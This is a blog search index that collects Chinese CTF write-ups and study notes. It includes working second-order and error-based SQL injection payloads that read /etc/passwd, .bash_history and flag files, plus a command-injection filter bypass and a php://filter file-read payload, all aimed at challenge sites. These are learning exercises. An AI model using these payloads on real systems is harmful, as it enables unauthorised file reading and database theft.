<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020~7~27-[网鼎杯~2018]Comment-git源码泄露~二次注入</title>
      <link href="/2020/07/27/2020-7-27-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment-git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/07/27/2020-7-27-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment-git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><strong>比较考验基础知识吧，中间因为我的配置错误，王一航大佬的gitgacker几次都出现了问题。</strong></p><a id="more"></a><h3 id="1-Git源码泄露-amp-Wangyihang的GitHacker使用"><a href="#1-Git源码泄露-amp-Wangyihang的GitHacker使用" class="headerlink" title="1.Git源码泄露 &amp; Wangyihang的GitHacker使用"></a>1.Git源码泄露 &amp; Wangyihang的GitHacker使用</h3><p>开始我是用的lijiejie的githack，得出的<code>write_do.php</code>文件不完整，没办法，看wp发现没有<code>git log</code>，后来发现wp上用的是王一航大佬的githacker，可能与githack各有优缺吧（可能是比githack强的），然后我就在windows上面clone下来了，结果环境要求linux，我直接崩溃。转到美化过的ubuntu之后（美化过的ubuntu真漂亮），clone之后又出现了错误，错误是<code>git log --reflog</code>命令之后出现的与wp的又不一样，这次真的佛了（后来才知道这样也能得出最终的结果，就是与wp描述的稍微有些不一样，毕竟我的ubuntu是新建的。），因为开始报的错误，一航大佬的脚本刷出的内容又贼长，一直没注意到需要绑定自己的邮箱与用户名，绑定之后终于不报错了。</p><p><img src= "/img/loading.gif" data-src="1.png" alt="成功了"></p><p>下面简述一下如果没有出错的需要做的流程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHacker.py url/.git/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> 产生的文件夹</span><br><span class="line"></span><br><span class="line">git <span class="built_in">log</span> --reflog</span><br><span class="line">git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br></pre></td></tr></table></figure><p>这样文件<code>write_do.php</code>文件就好起来了，下面是<code>write_do.php</code>的具体内容:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-二次注入"><a href="#2-二次注入" class="headerlink" title="2.二次注入"></a>2.二次注入</h3><p>常见于评论、···（还没总结）。</p><hr><blockquote><p>常见于：常见于两个界面，一个用于输入数据（注入的有问题的SQL代码），另一个界面对数据查询（查询注入结果）。</p></blockquote><blockquote><p>成因：输入数据的界面对输入的数据进行了转义，但是查询数据的时候没有对数据进行转义，因为数据存入数据库的时候自动清除了反斜杠。</p></blockquote><hr><h4 id="1-要先登陆，弱密码"><a href="#1-要先登陆，弱密码" class="headerlink" title="1.要先登陆，弱密码"></a>1.要先登陆，弱密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangwei</span><br><span class="line">zhangwei666</span><br></pre></td></tr></table></figure><h4 id="2-找到二次注入点"><a href="#2-找到二次注入点" class="headerlink" title="2.找到二次注入点"></a>2.找到二次注入点</h4><p><strong>addslashes的定义和用法</strong></p><blockquote><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>预定义字符是：</p></blockquote><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><p>简单说就是转义这四个字符的函数。</p><p>第一次write的时候，category的内容可以作为注入点，因为后面comment的时候，也就是下面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">这里我们第二次输入comment的时候，没对category进行转义，可能会出现以下情形</span><br><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '1',content=(select load_file('/etc/passwd')),/*',</span></span><br><span class="line"><span class="string">            comment = '*/#',</span></span><br><span class="line"><span class="string">            bo_id = '2';</span></span><br></pre></td></tr></table></figure><p>这里的load_file利用，看wp上面说是一个高权限读取文件的函数，/**/和#分别注释掉了多行与单行的SQL query，注入<code>select load_file(&#39;etc/passwd&#39;)</code></p><h4 id="3-进行注入"><a href="#3-进行注入" class="headerlink" title="3.进行注入"></a>3.进行注入</h4><p>下面是payload<br><strong>先测试payload行不行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一步</span><br><span class="line">1</span><br><span class="line">1&#39;,content&#x3D;(select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)),&#x2F;*</span><br><span class="line">1</span><br><span class="line">第二步</span><br><span class="line">*&#x2F;#</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="2.png" alt="获取etc目录下的passwd文件"><br>成功了，下一步可以查下主目录下的flag，试了/flag、/flag.txt、/flag.php，果不其然，都没找到。</p><h3 id="3-回溯历史"><a href="#3-回溯历史" class="headerlink" title="3.回溯历史"></a>3.回溯历史</h3><h4 id="1-读取-bash-history"><a href="#1-读取-bash-history" class="headerlink" title="1.读取.bash_history"></a>1.读取.bash_history</h4><p>上一步测试payload的时候，有获取到www目录的位置(/home/www/)，看一下(/home/www/.bash_history)文件，记录了命令行命令的使用历史，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一步</span><br><span class="line">1</span><br><span class="line">1&#39;,content&#x3D;(select load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;)),&#x2F;*</span><br><span class="line">1</span><br><span class="line">第二步</span><br><span class="line">*&#x2F;#</span><br></pre></td></tr></table></figure><p>获得结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">unzip html.zip</span><br><span class="line">rm -f html.zip</span><br><span class="line">cp -r html /var/www/  <span class="comment">#注意这里</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">rm -f .DS_Store</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>看wp说要看.DS_Store文件找到flag文件的名字，但是要怎么找呢？这里因为/tmp目录下存放了html的临时文件(不太明白，对linux的这种行为不是很了解)，先</p><h4 id="2-读取-tmp-html-DS-Store-文件，"><a href="#2-读取-tmp-html-DS-Store-文件，" class="headerlink" title="2.读取(/tmp/html/.DS_Store)文件，"></a>2.读取(/tmp/html/.DS_Store)文件，</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一步</span><br><span class="line">1</span><br><span class="line">1&#39;,content&#x3D;(select load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;)),&#x2F;*</span><br><span class="line">1</span><br><span class="line">第二步</span><br><span class="line">*&#x2F;#</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="3.png" alt="显示为乱码"><br>可能是文件的编码有问题，所以可以先hex后再转为字符串查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一步</span><br><span class="line">1</span><br><span class="line">1&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br><span class="line">1</span><br><span class="line">第二步</span><br><span class="line">*&#x2F;#</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="4.png" alt="4.png"><br>这算是个线索吧，文件名是flag_8946e1ff1ee3e40f.php,</p><h4 id="3-读flag"><a href="#3-读flag" class="headerlink" title="3.读flag"></a>3.读flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一步</span><br><span class="line">1</span><br><span class="line">1&#39;,content&#x3D;(select hex(load_file(&#39;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br><span class="line">1</span><br><span class="line">第二步</span><br><span class="line">*&#x2F;#</span><br></pre></td></tr></table></figure><p>/tmp目录下的那个flag是假的，真的在/var目录下</p><p><strong>当然我们也能直接读(就是去掉hex())，f12一下就能获取flag了</strong><br><img src= "/img/loading.gif" data-src="5.png" alt="如图所示"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Git源码泄露 </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>whuctf部分web</title>
      <link href="/2020/05/26/whuctf%E9%83%A8%E5%88%86web/"/>
      <url>/2020/05/26/whuctf%E9%83%A8%E5%88%86web/</url>
      
        <content type="html"><![CDATA[<p><strong>几道简单的web题目</strong></p><a id="more"></a><h4 id="1-ezcmd"><a href="#1-ezcmd" class="headerlink" title="1.ezcmd"></a>1.ezcmd</h4><p>这个替我曾经做过，有点印象，<br>payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;a&#x3D;g;sort$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p><code>命令执行相关绕过知识点：</code><br>1.借助a=g绕过对flag关键词的匹配。<br>2.没有封禁sort读取文件的方法。<br>3.利用$IFS$1绕过空格。</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker本地ubuntu_18.04</title>
      <link href="/2020/05/18/docker%E6%9C%AC%E5%9C%B0ubuntu-18-08/"/>
      <url>/2020/05/18/docker%E6%9C%AC%E5%9C%B0ubuntu-18-08/</url>
      
        <content type="html"><![CDATA[<p>我前几天重装了系统，很多环境都得重新配置，现在学一下docker，明天继续web。</p><a id="more"></a><h5 id="先安装Ubuntu18-04虚拟机"><a href="#先安装Ubuntu18-04虚拟机" class="headerlink" title="先安装Ubuntu18.04虚拟机"></a>先安装Ubuntu18.04虚拟机</h5><p>这一步很简单，就不记录了。</p><h5 id="Ubuntu安装docker"><a href="#Ubuntu安装docker" class="headerlink" title="Ubuntu安装docker"></a>Ubuntu安装docker</h5><p><strong>命令:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker.io</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种伪协议</title>
      <link href="/2020/05/10/%E5%90%84%E7%A7%8D%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/05/10/%E5%90%84%E7%A7%8D%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的学习(提前学习了，业余爱好)  &lt;一&gt;</title>
      <link href="/2020/05/09/PHP%E7%9A%84%E5%AD%A6%E4%B9%A0(%E6%8F%90%E5%89%8D%E5%AD%A6%E4%B9%A0%E4%BA%86%EF%BC%8C%E4%B8%9A%E4%BD%99%E7%88%B1%E5%A5%BD)%20%20%E4%B8%80/"/>
      <url>/2020/05/09/PHP%E7%9A%84%E5%AD%A6%E4%B9%A0(%E6%8F%90%E5%89%8D%E5%AD%A6%E4%B9%A0%E4%BA%86%EF%BC%8C%E4%B8%9A%E4%BD%99%E7%88%B1%E5%A5%BD)%20%20%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p><strong>一个函数一个函数地堆</strong></p><h4 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h4><p>在本地测试的时候，代码与显示如下<br><strong>1.</strong>代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strstr(<span class="string">"I love Shanghai!123"</span>,<span class="string">"Shanghai"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shanghai!123</span><br></pre></td></tr></table></figure><p><strong>2.</strong>代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strstr(<span class="string">"I love Shanghai!123"</span>,<span class="string">"Shanghai"</span>,<span class="keyword">true</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I love</span><br></pre></td></tr></table></figure><h5 id="分析输出"><a href="#分析输出" class="headerlink" title="分析输出"></a>分析输出</h5><p>函数的格式为：strstr(“待比较字符串(大)”,”被比较字符串(小)”,true | false)<br>其中，第三个option默认为false。<br>其中，false返回的是比较字符串之后的剩余字符；<br>&emsp;&emsp;&emsp;true返回的是字符串之前的所有字符。</p><h4 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace()函数"></a>str_replace()函数</h4><p><strong>代码:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">"world"</span>,<span class="string">"Shanghai"</span>,<span class="string">"Hello world! Hello world!"</span>,$count);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$count;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello Shanghai! Hello Shanghai!</span><br><span class="line">2</span><br></pre></td></tr></table></figure><h5 id="分析输出-1"><a href="#分析输出-1" class="headerlink" title="分析输出"></a>分析输出</h5><p>替换匹配到的字符串，并且可以计数。<br><strong>标准格式</strong><br><strong>代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>find</td><td>必需。规定要查找的值。</td></tr><tr><td>replace</td><td>必需。规定替换 find 中的值的值。</td></tr><tr><td>string</td><td>必需。规定被搜索的字符串。</td></tr><tr><td>count</td><td>可选。对替换数进行计数的变量。</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯—-2018:fakebook</title>
      <link href="/2020/04/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E2%80%94-2018-fakebook/"/>
      <url>/2020/04/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E2%80%94-2018-fakebook/</url>
      
        <content type="html"><![CDATA[<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>不会，下面是贴大佬的文章<br><a href="https://blog.csdn.net/qq_42196196/article/details/81952174?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81952174?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1</a></p><a id="more"></a><p>下面是学到的内容<br>这个是报错注入的另一种情形，首先发现注入点是在user用户界面，即：view.php页面处，参数是no=1<br>查表payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)#</span><br></pre></td></tr></table></figure><p>表：users<br>查列payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;)),1)#</span><br></pre></td></tr></table></figure><p>列：no,username,passwd,data,USER,C<br>查字段payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select data from users)),1)#</span><br></pre></td></tr></table></figure><p>可以看到是反序列化后的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(select(group_concat((right(data,<span class="number">27</span>))))from(users))),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>可以通过修改27处的数字拼接反序列化后的内容<br>看大佬的构造的payload，慢慢体会，相信一定会获得收获。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p>没回显，查看源码后发现iframe的内容已经改变了，点开链接就发现了flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;ad6acf06-30a0-4793-b057-d16917117100&#125;"</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>学到的更多的是报错注入<br>然后就是file协议的利用是在上面最后的构造payload处，即：s:4:”blog”;s:29:”file:///var/www/html/flag.php”;<br>所给的php文件对blog链接进行了curl操作，而链接是我们可控的，所以我们能利用一下，具体怎么利用，在本文开始的大佬链接处，请参考。</p><hr><p>-完-</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 报错注入 </tag>
            
            <tag> file协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WesternCTF2018_shrine</title>
      <link href="/2020/04/23/WesternCTF2018-shrine/"/>
      <url>/2020/04/23/WesternCTF2018-shrine/</url>
      
        <content type="html"><![CDATA[<p>这个想了半天没啥思路，直接查别人的wp，贴地址:<a href="https://blog.csdn.net/qq_42812036/article/details/104324923" target="_blank" rel="noopener">https://blog.csdn.net/qq_42812036/article/details/104324923</a></p><a id="more"></a><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>开始的页面猛一看乱七八糟，原来查源码会把它排一下版，感觉挺实用，记下来。。。看到flask就差不多能想到python模板注入了。以下是代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>这里，等我这两天要学一下这个flask和os。<br>文章里给了两种解决方法。</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>方法一payload：<code>/shrine/</code><br>方法二payload：<code>/shrine/</code><br>手打加深记忆。</p><hr><p>-完-</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> python模板注入 </tag>
            
            <tag> python_os </tag>
            
            <tag> python_flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf隐写术</title>
      <link href="/2020/04/18/ctf%E9%9A%90%E5%86%99%E6%9C%AF/"/>
      <url>/2020/04/18/ctf%E9%9A%90%E5%86%99%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_26187985/article/details/83654197" target="_blank" rel="noopener">zip伪加密</a></p><a id="more"></a>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议读文件</title>
      <link href="/2020/04/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6/"/>
      <url>/2020/04/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="下面记录一下PHP伪协议的payload"><a href="#下面记录一下PHP伪协议的payload" class="headerlink" title="下面记录一下PHP伪协议的payload"></a>下面记录一下PHP伪协议的payload</h4><a id="more"></a><p><a href="http://127.0.0.1/xxx.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://127.0.0.1/xxx.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p><p>payload：?file=php://filter/read=convert.base64-encode/resource=index.php<br>-&gt;这里读取文件的文件名为index.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> php </tag>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF（二）</title>
